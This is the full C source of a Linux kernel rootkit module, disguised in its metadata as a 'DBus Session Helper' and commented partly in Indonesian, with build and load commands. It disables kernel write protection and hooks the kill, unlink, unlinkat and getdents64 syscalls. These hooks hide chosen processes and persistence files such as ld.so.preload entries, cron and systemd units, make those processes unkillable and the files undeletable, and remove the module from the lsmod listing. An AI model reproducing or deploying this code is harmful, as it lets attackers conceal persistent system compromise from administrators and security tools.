/*
 * gsock_protect.c — Kernel Rootkit Module
 *
 * Fix: terima syscall_table_addr dari parameter (dibaca dari /proc/kallsyms)
 *      tidak pakai kprobe scan yang bisa hang di kernel 6.x
 *
 * Build: make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
 * Load:  insmod gsock_protect.ko syscall_table_addr=0x... protected_pids=1,2,3
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/string.h>
#include <linux/errno.h>
#include <linux/types.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("kworker");
MODULE_DESCRIPTION("DBus Session Helper");

// ─── PARAMETERS ───────────────────────────────────────────────────────────────

/* Address syscall table — diisi dari kmod_deploy.py via /proc/kallsyms */
static unsigned long syscall_table_addr = 0;
module_param(syscall_table_addr, ulong, 0);
MODULE_PARM_DESC(syscall_table_addr, "Address of sys_call_table");

static int protected_pids[32] = {0};
static int protected_pid_count = 0;
module_param_array(protected_pids, int, &protected_pid_count, 0644);
MODULE_PARM_DESC(protected_pids, "PIDs to protect");

// ─── PROTECTED FILES ──────────────────────────────────────────────────────────

static const char *protected_files[] = {
    "/dev/shm/.kworker",
    "/run/.systemd-private",
    "/tmp/.dbus-session",
    "/usr/lib/libstealth.so",
    "/etc/ld.so.preload",
    "/etc/cron.d/.systemd-sync",
    "/etc/systemd/system/.dbus-helper.service",
    "/etc/profile.d/.bash_helper.sh",
    NULL
};

// ─── SYSCALL TABLE ────────────────────────────────────────────────────────────

static unsigned long *syscall_table = NULL;

static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
static asmlinkage long (*orig_unlinkat)(const struct pt_regs *regs);
static asmlinkage long (*orig_unlink)(const struct pt_regs *regs);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);

// ─── CR0 bypass via inline asm ────────────────────────────────────────────────

static inline void disable_wp(void)
{
    unsigned long cr0;
    asm volatile("mov %%cr0, %0" : "=r"(cr0));
    cr0 &= ~0x00010000UL;
    asm volatile("mov %0, %%cr0" :: "r"(cr0) : "memory");
}

static inline void enable_wp(void)
{
    unsigned long cr0;
    asm volatile("mov %%cr0, %0" : "=r"(cr0));
    cr0 |= 0x00010000UL;
    asm volatile("mov %0, %%cr0" :: "r"(cr0) : "memory");
}

// ─── HELPERS ─────────────────────────────────────────────────────────────────

static int is_protected_pid(pid_t pid)
{
    int i;
    for (i = 0; i < protected_pid_count; i++) {
        if (protected_pids[i] == (int)pid)
            return 1;
    }
    return 0;
}

static int is_protected_file(const char __user *pathname)
{
    char kpath[256];
    int  i;

    if (!pathname)
        return 0;
    if (strncpy_from_user(kpath, pathname, sizeof(kpath) - 1) < 0)
        return 0;
    kpath[255] = '\0';

    for (i = 0; protected_files[i]; i++) {
        const char *bn;
        if (strcmp(kpath, protected_files[i]) == 0)
            return 1;
        bn = strrchr(protected_files[i], '/');
        if (bn && strcmp(kpath, bn + 1) == 0)
            return 1;
    }
    return 0;
}

// ─── HOOKED SYSCALLS ─────────────────────────────────────────────────────────

static asmlinkage long hooked_kill(const struct pt_regs *regs)
{
    pid_t pid = (pid_t)regs->di;
    if (is_protected_pid(pid))
        return -ESRCH;
    return orig_kill(regs);
}

static asmlinkage long hooked_unlinkat(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->si;
    if (is_protected_file(pathname))
        return -ENOENT;
    return orig_unlinkat(regs);
}

static asmlinkage long hooked_unlink(const struct pt_regs *regs)
{
    const char __user *pathname = (const char __user *)regs->di;
    if (is_protected_file(pathname))
        return -ENOENT;
    return orig_unlink(regs);
}

struct my_dirent64 {
    u64            d_ino;
    s64            d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char           d_name[256];
};

static asmlinkage long hooked_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent =
        (struct linux_dirent64 __user *)regs->si;
    struct my_dirent64 *kbuf;
    long ret, offset, new_off;

    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    kbuf = kzalloc((size_t)ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, dirent, (unsigned long)ret)) {
        kfree(kbuf);
        return ret;
    }

    offset  = 0;
    new_off = 0;

    while (offset < ret) {
        struct my_dirent64 *cur =
            (struct my_dirent64 *)((char *)kbuf + offset);
        long reclen = (long)cur->d_reclen;
        int  hide   = 0;
        int  i;
        char *ep;
        long pval;

        if (reclen <= 0)
            break;

        offset += reclen;

        pval = simple_strtol(cur->d_name, &ep, 10);
        if (*ep == '\0' && is_protected_pid((pid_t)pval))
            hide = 1;

        for (i = 0; protected_files[i] && !hide; i++) {
            const char *bn = strrchr(protected_files[i], '/');
            if (bn && strcmp(cur->d_name, bn + 1) == 0)
                hide = 1;
        }

        if (hide)
            continue;

        if (new_off != offset - reclen)
            memmove((char *)kbuf + new_off,
                    (char *)kbuf + (offset - reclen),
                    (size_t)reclen);
        new_off += reclen;
    }

    if (copy_to_user(dirent, kbuf, (unsigned long)new_off)) {
        kfree(kbuf);
        return ret;
    }

    kfree(kbuf);
    return new_off;
}

// ─── HIDE MODULE dari lsmod ──────────────────────────────────────────────────

static struct list_head *prev_module_entry;

static void hide_module(void)
{
    prev_module_entry = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

static void protect_module(void)
{
    try_module_get(THIS_MODULE);
    try_module_get(THIS_MODULE);
    try_module_get(THIS_MODULE);
}

// ─── INIT / EXIT ─────────────────────────────────────────────────────────────

static int __init gsock_protect_init(void)
{
    if (!syscall_table_addr) {
        pr_err("gsock: syscall_table_addr parameter required\n");
        return -EINVAL;
    }

    syscall_table = (unsigned long *)syscall_table_addr;

    orig_kill       = (void *)syscall_table[__NR_kill];
    orig_unlinkat   = (void *)syscall_table[__NR_unlinkat];
    orig_unlink     = (void *)syscall_table[__NR_unlink];
    orig_getdents64 = (void *)syscall_table[__NR_getdents64];

    disable_wp();
    syscall_table[__NR_kill]       = (unsigned long)hooked_kill;
    syscall_table[__NR_unlinkat]   = (unsigned long)hooked_unlinkat;
    syscall_table[__NR_unlink]     = (unsigned long)hooked_unlink;
    syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    enable_wp();

    protect_module();
    hide_module();

    return 0;
}

static void __exit gsock_protect_exit(void)
{
    if (!syscall_table)
        return;

    disable_wp();
    syscall_table[__NR_kill]       = (unsigned long)orig_kill;
    syscall_table[__NR_unlinkat]   = (unsigned long)orig_unlinkat;
    syscall_table[__NR_unlink]     = (unsigned long)orig_unlink;
    syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    enable_wp();

    list_add(&THIS_MODULE->list, prev_module_entry);
}

module_init(gsock_protect_init);
module_exit(gsock_protect_exit);
